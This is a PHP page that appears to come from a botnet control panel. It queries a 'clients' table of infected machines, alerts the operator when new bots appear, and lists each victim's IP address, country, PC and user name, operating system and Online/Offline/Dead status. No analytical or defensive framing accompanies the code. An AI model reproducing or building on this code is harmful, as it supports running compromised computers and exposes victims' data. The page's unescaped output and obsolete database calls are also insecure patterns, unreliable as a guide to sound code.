<?php
error_reporting(0);
session_start();
require_once('inc/session.php');

require_once('inc/config.php');

include('inc/functions.php');

include("inc/ip_files/countries.php");

$query_1    = mysql_query("SELECT COUNT(*) FROM clients ");
$item_count = mysql_result($query_1, 0);
$query_1    = mysql_query("SELECT * FROM clients ORDER BY id DESC");
$newbots    = mysql_num_rows(mysql_query("SELECT * FROM clients"));

if ($_SESSION['currentbots'] < $newbots)
  {
    echo '
	<script type="text/javascript">

	alwaysOnTop.init({
	targetid: \'examplediv\',
	orientation: 3,
	position: [5, 10],
	fadeduration: [1000, 1000],
	frequency: 0.95,
	hideafter: 3000
	})

	alwaysOnTop.init({
	targetid: \'ajaxdiv\',
	orientation: 1,
	position: [0, 0],
	hideafter: 3000,
	externalsource: \'inc/alert.php\'
	})

	</script>';
  }

$_SESSION['currentbots'] = $newbots;
echo '<table width=100%>
		  <tr>
		    <th class="th" style="text-align: center;">ID</th>
			<th class="th" style="text-align: center;">Country</th>
			<th class="th" style="text-align: center;">IP</th>
			<th class="th" style="text-align: center;">PC Name</th>
			<th class="th" style="text-align: center; width: 200px;">Operative System</th>			
			<th class="th" style="text-align: center; width: 60px;">Full Info</th> 
			<th class="th" style="text-align: center; width: 60px;">Status</th>';

while ($row = mysql_fetch_array($query_1))
  {
    $IPaddress               = $row['ip'];
    $two_letter_country_code = iptocountry($IPaddress);
    $country_name            = $countries[$two_letter_country_code][1];
    $cctolower               = strtolower($two_letter_country_code);
    $flagname                = "img/flags/".$cctolower.".gif";
    $file_to_check           = $flagname;
    $readable_date           = date("j F Y, G:i", $row['time']);
    echo '<tr>
			<td class="td" style="text-align: center;">' . $row['hid'] . '</td>
			<td class="td" style="text-align: center;">';
    if (file_exists($file_to_check))
      {
        print "<img src=$file_to_check> $country_name";
      }
    else
      {
        print "<img src=img/flags/noflag.gif> Unknow<br />";
      }
    
    echo '</td>
			<td class="td" style="text-align: center;">' . $row['ip'] . '</td>
			<td class="td" style="text-align: center;">' . $row['userandpc'] . '</td>
			<td class="td" style="text-align: center; width: 200px;">' . $row['os'] . '</td>						  
			<td class="td" style="text-align: center;"><a href=javascript:new_window("inc/full_info.php?id=' . base64_encode($row['id']) . '")><img src="img/info.png"></a></td>';
    if ($row['status'] == 'Online')
      {
        echo '<td class="td" style="text-align: center; color: green; width: 60px;">' . $row['status'] . '</td>';
      }
    
    if ($row['status'] == 'Offline')
      {
        echo '<td class="td" style="text-align: center; color: red; width: 60px;">' . $row['status'] . '</td>';
      }
    
    if ($row['status'] == 'Dead')
      {
        echo '<td class="td" style="text-align: center; color: black; width: 60px;">' . $row['status'] . '</td>';
      }
    
    '</tr>';
  }

echo '</table>';
?>